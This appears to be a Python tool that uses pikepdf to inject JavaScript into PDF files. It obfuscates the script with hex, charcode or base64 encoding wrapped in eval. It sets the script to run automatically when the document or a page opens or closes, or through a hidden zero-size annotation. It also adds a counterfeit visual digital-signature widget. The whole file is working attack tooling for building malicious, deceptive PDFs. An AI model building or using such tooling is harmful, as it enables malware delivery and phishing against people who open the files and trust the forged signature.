import pikepdf
import base64

# ---------- obfuscation utilities ----------
def _hex_escape(s):
    return ''.join('\\x{:02x}'.format(ord(c)) for c in s)

def _to_charcode(s):
    return f"String.fromCharCode({','.join(str(ord(c)) for c in s)})"

def _to_base64(s):
    return base64.b64encode(s.encode('utf-8')).decode('utf-8')

OFUSCACIONS = {
    "hex":      lambda s: f"unescape('{_hex_escape(s)}')",
    "charcode": _to_charcode,
    "base64":   lambda s: f"atob('{_to_base64(s)}')"
}
METODES_VALIDATS = set(OFUSCACIONS.keys())

# ---------- trigger constants ----------
TARGETS_VALIDATS = {"catalog", "page", "annotation"}

TRIG_CATALOG   = {"open": "/OpenAction", "close": "/WC"}
TRIG_PAGE      = {"open": "/O",          "close": "/C"}
TRIG_ANNOT     = {"down": "/D", "up": "/U", "enter": "/E", "exit": "/X"}

def _aplica_metodes(js_code, methods):
    for m in methods:
        if m not in METODES_VALIDATS:
            raise ValueError(f"[!] Unknown obfuscation method: {m}")
        print(f"[i] Applying obfuscation with: {m}")
        js_code = OFUSCACIONS[m](js_code)

    if methods:
        js_code = f"eval({js_code})"
    return js_code

def afegir_fake_signature(pdf, page_num=1):
    """
    Inserts a visual annotation simulating a digital signature
    but without cryptographic validity.
    """
    try:
        page = list(pdf.pages)[page_num - 1]
        page_dict = page.obj

        fake_sig = pdf.make_indirect({
            "/Type": pikepdf.Name("/Annot"),
            "/Subtype": pikepdf.Name("/Widget"),
            "/FT": pikepdf.Name("/Sig"),
            "/Rect": [400, 20, 550, 60],  # bottom right corner
            "/T": pikepdf.String("Fake digital signature"),
            "/V": pikepdf.String("Simulated — not valid"),
            "/F": 4
        })

        if "/Annots" not in page_dict:
            page_dict["/Annots"] = pdf.make_indirect([])

        annots_obj = page_dict["/Annots"]
        try:
            annots = annots_obj.get_object()
        except ValueError:
            annots = annots_obj
        annots.append(fake_sig)

        print(f"[+] Simulated visual signature added on page {page_num}.")

    except Exception as e:
        print(f"[!] Error adding fake signature: {e}")

# ---------- main function ----------
def inject_javascript(pdf, js_code, *, methods=None,
                      target="catalog", trigger=None, page_num=1):
    """
    Injects JS into the PDF.

    parameters
    ----------
    pdf        : pikepdf.Pdf
    js_code    : str
    methods    : list[str]  -> ['hex', 'charcode', 'base64']
    target     : 'catalog' | 'page' | 'annotation'
    trigger    : depends on target (see table)
    page_num   : int (1-based) for 'page' or 'annotation'
    """
    try:
        # -------- obfuscation --------
        methods = methods or []
        js_code = _aplica_metodes(js_code, methods) if methods else js_code

        # -------- validations --------
        if target not in TARGETS_VALIDATS:
            raise ValueError(f"[!] Invalid target: {target}")

        # default triggers
        if trigger is None:
            trigger = {
                "catalog":   "open",
                "page":      "open",
                "annotation": "down"
            }[target]

        # PDF key maps
        key_map = {
            "catalog":   TRIG_CATALOG,
            "page":      TRIG_PAGE,
            "annotation": TRIG_ANNOT
        }[target]

        if trigger not in key_map:
            raise ValueError(f"[!] Trigger '{trigger}' not supported for target '{target}'")

        pdf_key = key_map[trigger]

        # -------- create the JavaScript action --------
        js_action = pdf.make_indirect({
            "/S": pikepdf.Name("/JavaScript"),
            "/JS": pikepdf.String(js_code)
        })

        # -------- inject according to target --------
        if target == "catalog":
            if pdf_key == "/OpenAction":
                pdf.root["/OpenAction"] = js_action
            else:  # /WC (When Close) goes inside /AA
                aa = pdf.root.get("/AA", pikepdf.Dictionary())
                aa[pikepdf.Name(pdf_key)] = js_action
                pdf.root["/AA"] = aa
            print(f"[+] JS injected in catalog with trigger '{trigger}'")

        elif target == "page":
            page = list(pdf.pages)[page_num - 1]
            page_dict = page.obj
            aa = page_dict.get("/AA", pikepdf.Dictionary())
            aa[pikepdf.Name(pdf_key)] = js_action
            page_dict["/AA"] = aa
            print(f"[+] JS injected on page {page_num} with trigger '{trigger}'")

        elif target == "annotation":
            page = list(pdf.pages)[page_num - 1]
            page_dict = page.obj

            annotation = pdf.make_indirect({
                "/Type": pikepdf.Name("/Annot"),
                "/Subtype": pikepdf.Name("/Text"),
                "/Rect": [0, 0, 0, 0],
                "/Contents": pikepdf.String(""),
                "/Name": pikepdf.Name("/Comment"),
                "/AA": pikepdf.Dictionary({ pdf_key: js_action })
            })

            # ensure /Annots exists and is a list
            if "/Annots" not in page_dict:
                page_dict["/Annots"] = pdf.make_indirect([])

            annots_obj = page_dict["/Annots"]
            try:
                annots = annots_obj.get_object()
            except ValueError:
                annots = annots_obj
            annots.append(annotation)

            print(f"[+] JS injected as annotation on page {page_num} with trigger '{trigger}'")

        return pdf

    except Exception as e:
        print(f"[!] Error injecting JavaScript: {e}")
        raise
